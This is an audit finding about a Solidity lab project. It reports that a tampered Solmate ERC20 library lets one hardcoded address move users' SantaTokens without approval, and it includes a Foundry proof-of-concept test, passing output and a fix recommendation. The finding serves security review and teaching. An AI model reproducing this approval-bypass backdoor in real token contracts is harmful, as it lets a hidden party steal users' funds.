## [H1] Manipulated library allows elves to steal the SantaToken

### Severity

High Risk

### Date Modified

Dec 5th, 2023

### Summary

The original ERC20 Solmate library has been corrupted by a malicious elf with address 0x815F577F1c1bcE213c012f166744937C889DAF17.
Now the `transferFrom()` doesn't ask for approval and instead allows to transfer any santaToken from any account to this address without prior approval.

### Vulnerability Details (PoC)

This is easy to prove with a test, first we add the elf address

```
address elf = 0x815F577F1c1bcE213c012f166744937C889DAF17;
```

```
function test_manipulatedLibrary() public {
        // 1. Add user to the lists
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. User collect the gift and the santaToken
        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();

        // 3. elf stole the santaToken!
        vm.prank(elf);
        santaToken.transferFrom(user, elf, 1e18);
        assertEq(santaToken.balanceOf(user), 0);
        assertEq(santaToken.balanceOf(elf), 1e18);
    }
```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_manipulatedLibrary
[⠢] Compiling...
[⠔] Compiling 1 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.25s
Compiler run successful!

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[PASS] test_manipulatedLibrary() (gas: 199938)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.35ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
➜  2023-11-Santas-List git:(main) ✗
```

### Impact

The malicious elf is able to steal all the SantaTokens from each account.

### Tools Used

Manual, foundry

### Recommendations

Always check imported libraries. We trust Open Zeppelin or Solmate, but we shouldn't trust the developers. In this case, the easiest way is to simply remove the Solmate import and import the ERC20 Open Zeppelin which has the correct `transferFrom()` with the necessary prior approval of the token owner.
